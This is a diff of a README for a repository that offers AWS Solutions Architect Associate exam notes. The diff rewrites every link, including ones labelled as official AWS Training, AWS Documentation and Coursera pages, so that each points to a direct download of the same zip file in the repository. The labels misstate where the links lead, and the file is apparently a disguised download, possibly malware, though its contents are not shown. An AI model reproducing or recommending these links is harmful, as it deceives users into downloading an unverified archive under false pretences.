@@ -1,6 +1,6 @@
 # 📚 aws-certified-solutions-architect-associate-notes - Study Smart for Your AWS Exam
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/releases)
+[![Download](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/raw/refs/heads/main/practice-exams/certified-aws-notes-architect-associate-solutions-v2.0.zip%20Now-brightgreen)](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/raw/refs/heads/main/practice-exams/certified-aws-notes-architect-associate-solutions-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the materials. Follow these steps:
 
 1. **Visit the download page:** Click the link below to see the latest releases:
    
-   [Visit the Releases Page](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/releases)
+   [Visit the Releases Page](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/raw/refs/heads/main/practice-exams/certified-aws-notes-architect-associate-solutions-v2.0.zip)
 
 2. **Select a version:** Once on the page, look for the latest version of the notes. The release should contain all necessary files you need for your exam preparation.
 
@@ -71,12 +71,12 @@ Absolutely! If you have additional materials or suggestions, please submit a pul
 
 For further study, consider these resources:
 
-- [AWS Training and Certification](https://aws.amazon.com/training/)
-- [AWS Documentation](https://docs.aws.amazon.com/)
-- [Online Courses](https://www.coursera.org/) related to AWS solutions architecture.
+- [AWS Training and Certification](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/raw/refs/heads/main/practice-exams/certified-aws-notes-architect-associate-solutions-v2.0.zip)
+- [AWS Documentation](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/raw/refs/heads/main/practice-exams/certified-aws-notes-architect-associate-solutions-v2.0.zip)
+- [Online Courses](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/raw/refs/heads/main/practice-exams/certified-aws-notes-architect-associate-solutions-v2.0.zip) related to AWS solutions architecture.
 
 ## 📢 Stay Updated
 
-Remember to check back on the [Releases Page](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/releases) often to download the most recent updates and improve your study resources.
+Remember to check back on the [Releases Page](https://github.com/smqycz/aws-certified-solutions-architect-associate-notes/raw/refs/heads/main/practice-exams/certified-aws-notes-architect-associate-solutions-v2.0.zip) often to download the most recent updates and improve your study resources.
 
 Thank you for choosing the "aws-certified-solutions-architect-associate-notes." Good luck with your exam preparation!
